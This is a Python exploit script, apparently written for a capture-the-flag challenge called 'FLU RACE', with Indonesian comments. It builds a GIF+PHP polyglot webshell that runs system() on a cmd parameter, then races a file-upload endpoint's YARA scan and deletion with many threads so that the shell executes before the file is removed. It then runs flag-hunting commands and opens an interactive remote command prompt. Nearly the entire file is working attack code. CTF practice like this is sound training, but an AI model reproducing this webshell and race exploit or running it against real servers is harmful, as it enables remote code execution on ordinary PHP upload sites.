#!/usr/bin/env python3
"""
FLU RACE Challenge - Race Condition Exploit (Optimized)
Output lebih ringkas, threads dikurangi
"""

import requests
import threading
import time
import sys
from urllib.parse import urljoin
import queue

# Konfigurasi
TARGET_URL = "http://195.85.19.90:6005"
UPLOAD_ENDPOINT = "/upload.php"
UPLOADS_DIR = "/uploads/"

# Konfigurasi Exploit (BISA DIUBAH)
THREADS_PER_ATTEMPT = 30      # Dikurangi dari 100 -> 30
MAX_ATTEMPTS = 10             # Dikurangi dari 20 -> 10
VERBOSE = False               # Set True untuk output detail

# Global variables
found_flag = False
success_queue = queue.Queue()
lock = threading.Lock()

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.HEADER}{'='*60}
  🏁 FLU RACE - Race Condition Exploit (Optimized)
{'='*60}{Colors.ENDC}
Target: {Colors.OKCYAN}{TARGET_URL}{Colors.ENDC}
Threads: {Colors.OKCYAN}{THREADS_PER_ATTEMPT}{Colors.ENDC} | Attempts: {Colors.OKCYAN}{MAX_ATTEMPTS}{Colors.ENDC}
"""
    print(banner)

def create_polyglot_file():
    """Membuat polyglot GIF+PHP"""
    gif_header = b'\x47\x49\x46\x38\x39\x61'
    gif_data = b'\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    
    php_code = b"""<?php
@error_reporting(0);
if(isset($_GET['cmd'])){
    echo "<<<START>>>";
    system($_GET['cmd']);
    echo "<<<END>>>";
    die();
}
?>"""
    
    return gif_header + gif_data + php_code

def upload_file(filename, content, session):
    """Upload file ke server"""
    url = urljoin(TARGET_URL, UPLOAD_ENDPOINT)
    
    files = {'imageFile': (filename, content, 'image/gif')}
    data = {'submit': 'Upload Image'}
    
    try:
        response = session.post(url, files=files, data=data, timeout=10)
        return response
    except:
        return None

def access_webshell(filename, cmd, session, thread_id):
    """Akses webshell dengan command"""
    global found_flag
    
    url = urljoin(TARGET_URL, UPLOADS_DIR + filename)
    
    try:
        response = session.get(url, params={'cmd': cmd}, timeout=5)
        
        if response.status_code == 200:
            text = response.text
            
            # Check jika PHP berhasil dieksekusi
            if "<<<START>>>" in text or "uid=" in text or "root" in text:
                with lock:
                    if not found_flag:  # Only print first success
                        print(f"\n{Colors.OKGREEN}[Thread {thread_id}] ✅ SUCCESS!{Colors.ENDC}")
                        
                        # Extract clean output
                        if "<<<START>>>" in text:
                            output = text.split("<<<START>>>")[1].split("<<<END>>>")[0]
                        else:
                            output = text[:500]
                        
                        print(f"{Colors.OKGREEN}{output}{Colors.ENDC}")
                        success_queue.put((filename, cmd, output))
                        found_flag = True
                return True
            elif VERBOSE and len(text) > 0:
                print(f"[T{thread_id}] Got response ({len(text)} bytes)")
                
    except:
        pass
    
    return False

def race_condition_attack(filename, cmd="id", num_threads=30):
    """Melakukan race condition attack"""
    global found_flag
    found_flag = False
    
    content = create_polyglot_file()
    upload_session = requests.Session()
    access_sessions = [requests.Session() for _ in range(num_threads)]
    access_threads = []
    
    # Siapkan threads
    for i in range(num_threads):
        t = threading.Thread(
            target=access_webshell,
            args=(filename, cmd, access_sessions[i], i),
            daemon=True
        )
        access_threads.append(t)
    
    # Start access threads
    for t in access_threads:
        t.start()
    
    time.sleep(0.01)
    
    # Upload file
    upload_file(filename, content, upload_session)
    
    # Wait dengan timeout
    start_time = time.time()
    timeout = 3
    
    for t in access_threads:
        remaining = timeout - (time.time() - start_time)
        if remaining > 0:
            t.join(timeout=remaining)
    
    return not success_queue.empty()

def continuous_race_attack(filename, cmd="id", attempts=10, threads=30):
    """Multiple attempts race condition"""
    
    print(f"\n{Colors.OKBLUE}[*] Testing: {filename}{Colors.ENDC}")
    print(f"    Command: {cmd} | Threads: {threads} | Attempts: {attempts}")
    
    for attempt in range(1, attempts + 1):
        # Progress indicator
        progress = '█' * attempt + '░' * (attempts - attempt)
        print(f"\r    [{progress}] {attempt}/{attempts}", end='', flush=True)
        
        if race_condition_attack(filename, cmd, threads):
            print(f"\n{Colors.OKGREEN}    ✅ Success at attempt {attempt}!{Colors.ENDC}")
            return True
        
        time.sleep(0.3)
    
    print(f"\n{Colors.FAIL}    ❌ Failed{Colors.ENDC}")
    return False

def exploit_with_race_condition():
    """Main exploit"""
    
    filenames = [
        "shell.php.jpg",
        "exploit.php.png", 
        "last.php.jpg",
        "cmd.php.gif",
    ]
    
    test_cmd = "id"
    
    print(f"\n{Colors.HEADER}[Phase 1] Finding Working Filename{Colors.ENDC}")
    
    for filename in filenames:
        if continuous_race_attack(filename, test_cmd, MAX_ATTEMPTS, THREADS_PER_ATTEMPT):
            print(f"\n{Colors.OKGREEN}{'='*60}")
            print(f"  ✅ Webshell Active: {filename}")
            print(f"{'='*60}{Colors.ENDC}")
            return filename
    
    return None

def find_flag_with_race(filename):
    """Cari flag dengan race condition"""
    
    print(f"\n{Colors.HEADER}[Phase 2] Hunting for FLAG{Colors.ENDC}")
    
    flag_commands = [
        ("List root directory", "ls -la /"),
        ("Check flag.txt", "cat /flag.txt 2>/dev/null"),
        ("Check html dir", "cat /var/www/html/flag.txt 2>/dev/null"),
        ("Find flag files", "find / -name '*flag*' -type f 2>/dev/null | head -5"),
        ("Check environment", "env | grep -i flag"),
        ("Parent directory", "cat ../flag.txt 2>/dev/null"),
        ("Current directory", "ls -la"),
    ]
    
    results = []
    
    for desc, cmd in flag_commands:
        print(f"\n{Colors.OKBLUE}[*] {desc}{Colors.ENDC}")
        print(f"    $ {cmd}")
        
        # Clear queue
        while not success_queue.empty():
            success_queue.get()
        
        if race_condition_attack(filename, cmd, THREADS_PER_ATTEMPT):
            if not success_queue.empty():
                _, _, output = success_queue.get()
                results.append((desc, cmd, output))
                
                # Check jika ketemu flag
                if "flag{" in output.lower() or "ctf{" in output.lower():
                    print(f"\n{Colors.OKGREEN}{'='*60}")
                    print(f"  🎉 FLAG FOUND!")
                    print(f"{'='*60}{Colors.ENDC}")
                    print(output)
                    return output
        
        time.sleep(0.5)
    
    # Print summary
    print(f"\n{Colors.HEADER}{'='*60}")
    print(f"  📋 Summary of Results")
    print(f"{'='*60}{Colors.ENDC}")
    
    for desc, cmd, output in results:
        print(f"\n{Colors.OKCYAN}[{desc}]{Colors.ENDC}")
        print(output[:200])
        if len(output) > 200:
            print("...")
    
    return None

def interactive_mode(filename):
    """Mode interaktif untuk eksekusi command"""
    
    print(f"\n{Colors.OKGREEN}{'='*60}")
    print(f"  🚀 Interactive Mode")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"Filename: {filename}")
    print(f"Commands akan dieksekusi via race condition")
    print(f"Type 'exit' to quit\n")
    
    while True:
        try:
            cmd = input(f"{Colors.BOLD}race> {Colors.ENDC}").strip()
            
            if cmd.lower() in ['exit', 'quit', 'q']:
                break
            
            if not cmd:
                continue
            
            # Clear queue
            while not success_queue.empty():
                success_queue.get()
            
            print(f"{Colors.OKBLUE}[*] Executing...{Colors.ENDC}")
            
            if race_condition_attack(filename, cmd, THREADS_PER_ATTEMPT):
                # Output sudah di-print di function access_webshell
                pass
            else:
                print(f"{Colors.FAIL}[-] Failed to execute (try again){Colors.ENDC}")
            
            print()
            
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Interrupted{Colors.ENDC}")
            break
        except Exception as e:
            print(f"{Colors.FAIL}[-] Error: {str(e)}{Colors.ENDC}")

def main():
    print_banner()
    
    print(f"{Colors.OKCYAN}[i] Cara kerja Race Condition:{Colors.ENDC}")
    print(f"""    1. Upload file → disimpan sementara
    2. YARA scan (butuh waktu)
    3. Validasi file
    4. File dihapus jika gagal
    
    {Colors.OKGREEN}→ Kita akses file di step 2-3 (sebelum dihapus){Colors.ENDC}
""")
    
    # Save output ke file
    log_file = f"exploit_log_{int(time.time())}.txt"
    print(f"{Colors.WARNING}[i] Output juga disimpan ke: {log_file}{Colors.ENDC}")
    
    sys.stdout = Logger(log_file, sys.stdout)
    
    input(f"{Colors.BOLD}Press Enter to start...{Colors.ENDC}")
    
    # Jalankan exploit
    result = exploit_with_race_condition()
    
    if result:
        # Cari flag
        flag = find_flag_with_race(result)
        
        if flag and ("flag{" in flag.lower() or "ctf{" in flag.lower()):
            print(f"\n{Colors.OKGREEN}🎉 CHALLENGE SOLVED! 🎉{Colors.ENDC}")
        else:
            # Interactive mode
            choice = input(f"\n{Colors.OKBLUE}Enter interactive mode? (y/n): {Colors.ENDC}").lower()
            if choice == 'y':
                interactive_mode(result)
    else:
        print(f"\n{Colors.FAIL}{'='*60}")
        print(f"  ❌ All attempts failed")
        print(f"{'='*60}{Colors.ENDC}")
        print(f"\n{Colors.WARNING}Tips:{Colors.ENDC}")
        print(f"1. Tingkatkan THREADS_PER_ATTEMPT (edit line 13)")
        print(f"2. Tingkatkan MAX_ATTEMPTS (edit line 14)")
        print(f"3. Set VERBOSE=True untuk debug (edit line 15)")
        print(f"4. Coba koneksi internet yang lebih cepat")

class Logger:
    """Logger untuk save output ke file"""
    def __init__(self, filename, terminal):
        self.terminal = terminal
        self.log = open(filename, 'w', encoding='utf-8')
    
    def write(self, message):
        self.terminal.write(message)
        # Remove color codes untuk file
        clean = message
        for code in ['\033[95m', '\033[94m', '\033[96m', '\033[92m', 
                     '\033[93m', '\033[91m', '\033[0m', '\033[1m']:
            clean = clean.replace(code, '')
        self.log.write(clean)
        self.log.flush()
    
    def flush(self):
        self.terminal.flush()
        self.log.flush()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Script stopped{Colors.ENDC}")
        sys.exit(0)